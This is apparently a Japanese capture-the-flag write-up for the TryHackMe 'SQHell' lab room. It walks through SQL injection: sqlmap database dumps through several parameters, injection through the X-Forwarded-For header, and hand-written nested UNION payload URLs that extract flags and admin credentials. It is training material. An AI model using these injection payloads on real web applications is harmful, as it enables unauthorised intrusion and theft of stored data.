# SQHell CTF

https://tryhackme.com/room/sqhell

## Enumeration

### ポートスキャン

```shell
root@ip-10-10-61-48:~# sudo nmap -sS -p- $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-05-07 07:59 BST
Nmap scan report for 10.10.76.124
Host is up (0.00044s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 02:19:4B:18:12:BD (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 2.48 seconds
```

SSH, HTTP

## ユーザー登録画面

ユーザー登録画面で、ユーザー名を入力中に使用可否をチェックしている。

```http
GET /register/user-check?username=thm HTTP/1.1
Host: 10.10.76.124
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
X-Requested-With: XMLHttpRequest
Connection: keep-alive
Referer: http://10.10.76.124/register
```

sqlmap（DB 名列挙）で、sqhell_3 データベースの存在を確認。

```shell
sqlmap -r ./req-register.txt -p username --dbs

available databases [2]:
[*] information_schema
[*] sqhell_3
```

flag, users テーブルの存在を確認。

```shell
sqlmap -r ./req-register.txt -p username -D sqhell_3 --tables

Database: sqhell_3
[2 tables]
+-------+
| flag  |
| users |
+-------+
```

admin パスワードとフラグ３ゲット。

```shell
sqlmap -r ./req-register.txt -p username -D sqhell_3 --dump-all

Table: users
[1 entry]
+----+---------------------------------+----------+
| id | password                        | username |
+----+---------------------------------+----------+
| 1  | ひみつ | admin    |
+----+---------------------------------+----------+

Table: flag
[1 entry]
+----+---------------------------------------------+
| id | flag                                        |
+----+---------------------------------------------+
| 1  | THM{FLAG3:97A.............................} |
+----+---------------------------------------------+
```

## ログイン画面

```http
POST /login HTTP/1.1
Host: 10.10.76.124
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 25
Origin: http://10.10.76.124
Connection: keep-alive
Referer: http://10.10.76.124/login
Upgrade-Insecure-Requests: 1

username=thm&password=abc
```

sqhell_2 データベースの存在を確認。

```shell
sqlmap -r ./req-login.txt --dbs

available databases [2]:
[*] information_schema
[*] sqhell_2
```

users テーブルだけ。

```shell
sqlmap -r ./req-login.txt -D sqhell_2 --tables

Database: sqhell_2
[1 table]
+-------+
| users |
+-------+
```

sqhell_2 テーブルと全く同じ認証情報が出てきた。無駄骨・・・？

```shell
sqlmap -r ./req-login.txt -D sqhell_2 --dump-all

Database: sqhell_2
Table: users
[1 entry]
+----+---------------------------------+----------+
| id | password                        | username |
+----+---------------------------------+----------+
| 1  | ひみつ | admin    |
+----+---------------------------------+----------+
```

これを使ってログインすると、フラグ１が表示される。

## dirsearch

```shell
$ dirsearch -u http://10.10.76.124
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/CTF/0507/reports/http_10.10.76.124/_25-05-07_04-01-36.txt

Target: http://10.10.76.124/

[04:01:36] Starting:
[04:03:03] 200 -    2KB - /login
[04:03:03] 200 -    2KB - /login/
[04:03:21] 200 -   21B  - /post
[04:03:25] 200 -    3KB - /register
[04:03:43] 200 -   21B  - /user
[04:03:43] 200 -   21B  - /user/

Task Completed
```

/post, /user を発見。

## /user

`Missing parameter: id` と表示される。

```http
GET /user?id=0 HTTP/1.1
Host: 10.10.76.124
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Upgrade-Insecure-Requests: 1
```

sqhell_4 データベースを発見。

```shell
sqlmap -r ./req-user.txt -p id --dbs

available databases [2]:
[*] information_schema
[*] sqhell_4
```

users テーブル

```shell
sqlmap -r ./req-user.txt -D sqhell_4 --tables --batch

Database: sqhell_4
[1 table]
+-------+
| users |
+-------+
```

？？？

```shell
sqlmap -r ./req-user.txt -D sqhell_4 --dump-all --batch

Database: sqhell_4
Table: users
[1 entry]
+----+----------+----------+
| id | password | username |
+----+----------+----------+
| 1  | password | admin    |
+----+----------+----------+
```

## /post

```shell
sqlmap -r ./req-post.txt --dbs --batch

available databases [2]:
[*] information_schema
[*] sqhell_5
```

```shell
sqlmap -r ./req-post.txt -D sqhell_5 --tables --batch

Database: sqhell_5
[3 tables]
+-------+
| flag  |
| posts |
| users |
+-------+
```

```shell
Table: users
[1 entry]
+----+----------+----------+
| id | password | username |
+----+----------+----------+
| 1  | password | admin    |
+----+----------+----------+
```

フラグ５ゲット。

```shell
Database: sqhell_5
Table: flag
[1 entry]
+----+---------------------------------------------+
| id | flag                                        |
+----+---------------------------------------------+
| 1  | THM{FLAG5:B9C............................8} |
+----+---------------------------------------------+
```

```shell
Database: sqhell_5
Table: posts
[2 entries]
+----+---------+-------------+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| id | user_id | name        | content                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
+----+---------+-------------+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| 1  | 1       | First Post  | Lorem ipsum dolor sit amet, consectetur adipiscing elit. In id mollis quam. Quisque quis enim eu velit dapibus dignissim quis id dolor. Sed volutpat, magna ut venenatis egestas, diam velit hendrerit nisl, ac suscipit lacus tortor ut nisi. Vestibulum finibus leo vitae consectetur cursus. Integer ut urna nulla. Ut vulputate imperdiet consequat. Sed et est maximus, porta lectus eget, lacinia ligula. Sed tristique odio id eleifend cursus.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  |
| 2  | 1       | Second Post | Etiam sit amet est in lacus ullamcorper luctus. Aliquam erat volutpat. Aliquam diam enim, consequat eget dui nec, congue porta enim. Integer venenatis dignissim erat, non elementum ante tincidunt a. Proin congue faucibus odio, at condimentum nibh hendrerit a. Sed posuere venenatis nisi, et laoreet lectus accumsan nec. Aenean sagittis eget tellus vitae volutpat. Praesent lobortis nulla eget urna aliquam, vel viverra enim pharetra. Nullam ac mauris eu erat dictum varius. Nam nulla ipsum, pretium feugiat luctus vel, condimentum et sapien. Nullam auctor pharetra volutpat. Fusce odio orci, pretium eget ligula sit amet, finibus elementum lectus. Etiam scelerisque imperdiet justo non luctus. Phasellus imperdiet odio venenatis, tempus erat eu, ultrices nisl. Morbi suscipit blandit nunc, nec accumsan elit convallis a. Donec gravida, diam sed elementum auctor, enim magna faucibus dui, a pharetra diam dui sed sapien. |
+----+---------+-------------+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
```

## フラグ２とフラグ４

フラグ２と４が未解決。

### フラグ２

ヒント

```
Make sure to read the terms and conditions ;)
```

Web ページ内に下記内容がある。

```
Terms and Conditions
We only have a few small terms:
i: We own the soul of any visitors
ii: We can't be blamed for any security breaches
iii: We log your IP address for analytics purposes
```

何を言っているのか全然わからなかったが、「X-Forwarded-For」ヘッダーを参照しているというヒントらしい。  
言われてみれば納得。下記コマンドでフラグ２が出てくる。

```shell
$ sqlmap –dbms mysql --headers="X-forwarded-for:1*" -u http://10.10.76.124 -D sqhell_1 --dump --batch
```

しかし正直、フラグ２が sqhell_1 に入っていた点については、そりゃねーよと思った。

### フラグ４

http://10.10.76.124/user?id=1 を表示したとき、下記が表示される。

```
User ID:  1
Username:  admin
Posts:
    First Post
    Second Post
```

http://10.10.76.124/user?id=10%20union%20select%201,2,3%20from%20users--%20- の結果が下記。  
username は users テーブルから、Posts のタイトルは posts テーブルから取っていると思われる。  
重要なのは、posts テーブルの where 条件として、users テーブルから返ってきた id を使っていると考えられる点。

```
User ID:  1
Username:  2
Posts:
    First Post
    Second Post
```

その証拠に、http://10.10.76.124/user?id=10%20union%20select%202,2,3%20from%20users--%20- とすると、Posts が空になる。

```
User ID:  2
Username:  2
Posts:
```

疑似コードで表現すると下記のイメージ。

```sql
id_user,username = (select id, username from users where id = <userinput>)

name_post = (select name from posts where id = id_user)

print(id_user, username, name_post)
```

http://10.10.76.124/user?id=10%20union%20select%202,flag,3%20from%20flag--%20-  
でフラグが返ってきても良さそうだと思うが、「Cannot find user」が返る。

http://10.10.76.124/user?id=10%20union%20select%202,2,3%20from%20posts--%20-  
でも「Cannot find user」が返る。  
おそらく、1 個目の users テーブルのクエリと 2 個目の posts テーブルのクエリでは、異なる DB に接続している。

イメージ的には、2 個目の SQL で下記のような形を作りたい。

```
select name from posts where id = 1 union select flag from flag
```

posts から 4 項目 Select しているのを確かめ、最終的には、

http://10.10.76.124/user?id=10%20union%20select%20%221%20union%20select%201,flag,3,4%20from%20flag%22,2,3%20from%20users--%20-

でフラグ４が返ってきた。

```
User ID:  1 union select 1,flag,3,4 from flag
Username:  2
Posts:
    First Post
    Second Post
    THM{FLAG4:BD.................................}
```

## 振り返り

- フラグと DB 番号が対応付けられているはずだと思い込んだため、難しくなった。
- sqlmap が自動的にダンプしてくれるのはその SQL を直接実行する DB だけであり、そのクエリ結果を使って他の DB をクエリするような場合は見逃してしまうという大きな教訓。
- `--headers="X-forwarded-for:1*"` のような sqlmap の使い方も初めて知ったので勉強になった。
